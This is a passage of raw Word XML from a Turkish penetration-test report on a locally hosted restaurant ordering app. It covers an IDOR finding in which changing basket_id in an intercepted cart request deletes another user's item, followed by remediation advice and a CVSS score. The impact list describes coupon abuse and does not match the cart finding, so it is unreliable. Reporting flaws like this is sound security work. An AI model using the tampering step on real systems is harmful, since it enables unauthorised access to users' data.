              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E544665" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00856007" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir kullanıcı, başka restoranlar için geçerli olan kuponları kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="321D8BCD" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00856007" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3288FBBC" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00402B96" w14:paraId="3776D7C4" w14:textId="77777777" w:rsidTr="000B1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20B4142D" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00402B96" w14:paraId="704C7702" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="654056BD" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00C361DB" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00402B96" w14:paraId="51E3BF30" w14:textId="77777777" w:rsidTr="000B1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407E8C93" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00402B96" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="292A81D6" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00593C92" w:rsidRDefault="003220EF" w:rsidP="003220EF"/>
    <w:p w14:paraId="5EC3A9B6" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00593C92" w:rsidRDefault="003220EF" w:rsidP="003220EF"/>
    <w:p w14:paraId="1372509B" w14:textId="29C8EE52" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="0069078A">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F02E9C" w14:paraId="2816E419" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="238B0A4D" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w14:paraId="5D9C8A63" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="1139486F" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w14:paraId="19BC2977" w14:textId="77777777" w:rsidTr="000B1BB4">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5975DD6B" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00057867" w14:paraId="0510E013" w14:textId="77777777" w:rsidTr="000B1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628F7AAB" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3561D40E" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00BF4DE0" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00057867" w14:paraId="7483C647" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="7370FB36" w14:textId="732DAB3B" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId52" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> kullanıcı</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId53" w:history="1">
              <w:r w:rsidRPr="007B7ED6">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_cart.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Sepetteki listelenen yemeklerde herhangi bir tanesinin </w:t>
            </w:r>
            <w:r w:rsidR="00B2509D">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Kaldır </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>butonuna tıklanır ve istek burpsuite Proxy aracı ile tutulur</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50623D4E" w14:textId="15A99683" w:rsidR="00F02E9C" w:rsidRDefault="00B2509D" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B2509D">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25FFDDA2" wp14:editId="63E6529C">
                  <wp:extent cx="5713730" cy="4324350"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="19471258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12585" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId54"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="4324350"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="63D6A862" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D06A9A5" w14:textId="41C0027C" w:rsidR="00F02E9C" w:rsidRPr="00081BEE" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Yakalanan istekte </w:t>
            </w:r>
            <w:r w:rsidRPr="001E0913">
              <w:t>basket_id=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">4 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>parametre</w:t>
            </w:r>
            <w:r w:rsidR="00B2509D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>si</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00B2509D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">2 değeri ile değiştirilir ve </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">başka bir kullanıcının sepetindeki </w:t>
            </w:r>
            <w:r w:rsidR="00B2509D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>ürün</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> başarıyla</w:t>
            </w:r>
            <w:r w:rsidR="00B2509D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> silinir</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43A6E3F3" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00CF0A67" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00057867" w14:paraId="72C53F36" w14:textId="77777777" w:rsidTr="000B1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7E5A8C4C" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00057867" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00D60321" w14:paraId="4E9616A7" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="1416E159" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00950946" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Güvenli bir kullanıcı doğrulama ve yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CCFC802" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00950946" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A38C2CD" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00FD2D0C" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w14:paraId="02605C9A" w14:textId="77777777" w:rsidTr="000B1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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EEFD8E3" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w14:paraId="4D90EB3C" w14:textId="77777777" w:rsidTr="000B1BB4">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="45CD3538" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00856007" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C7F84CD" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00856007" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Bir kullanıcı, başka restoranlar için geçerli olan kuponları </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7316AD0C" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00856007" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47F999DF" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00402B96" w14:paraId="68DB81AB" w14:textId="77777777" w:rsidTr="000B1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4B9D33DD" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00402B96" w14:paraId="55400D48" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="480A7BE6" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00C361DB" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F02E9C" w:rsidRPr="00402B96" w14:paraId="6109925E" w14:textId="77777777" w:rsidTr="000B1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154A5E1F" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00402B96" w:rsidRDefault="00F02E9C" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47410873" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00593C92" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C"/>
    <w:p w14:paraId="24EDF7A0" w14:textId="77777777" w:rsidR="00F02E9C" w:rsidRPr="00593C92" w:rsidRDefault="00F02E9C" w:rsidP="00F02E9C"/>
    <w:p w14:paraId="2E4DADF4" w14:textId="6FA672C0" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t>) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
